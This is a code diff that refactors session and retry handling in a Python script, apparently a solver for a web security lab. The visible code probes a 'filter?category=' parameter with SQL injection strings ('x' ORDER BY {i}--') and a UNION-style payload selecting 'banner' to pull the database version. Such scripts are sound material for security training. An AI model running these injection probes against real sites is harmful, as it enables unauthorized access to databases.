@@ -1,15 +1,12 @@
 import requests
 import sys
 from bs4 import BeautifulSoup
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
+from requests.adapters import HTTPAdapter, Retry
 
 
 
-def determine_columns(lab_url):
+def determine_columns(lab_url, session):
     try:
-        session = requests.Session()
-        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
         num_of_columns = 0
         for i in range(1, 20):
             response = session.get(f"{lab_url}/filter?category=x' ORDER BY {i}--", timeout=10)
@@ -43,9 +40,7 @@ def extract_text(response):
     return formatted_version_string
 
 
-def get_db_version(lab_url, num_of_columns):
-    session = requests.Session()
-    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+def get_db_version(lab_url, session, num_of_columns):
     for i in range(num_of_columns):
         payload = ["NULL"] * num_of_columns
         payload[i] = "banner"
@@ -63,8 +58,11 @@ def main():
         sys.exit(1)
 
     lab_url = sys.argv[1].rstrip('/')
-    num_of_columns = determine_columns(lab_url)
-    print(f"(+) Database Version Information: {get_db_version(lab_url, num_of_columns)}")
+    session = requests.Session()
+    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+
+    num_of_columns = determine_columns(lab_url, session)
+    print(f"(+) Database Version Information: {get_db_version(lab_url, session, num_of_columns)}")
 
 
 if __name__ == "__main__":
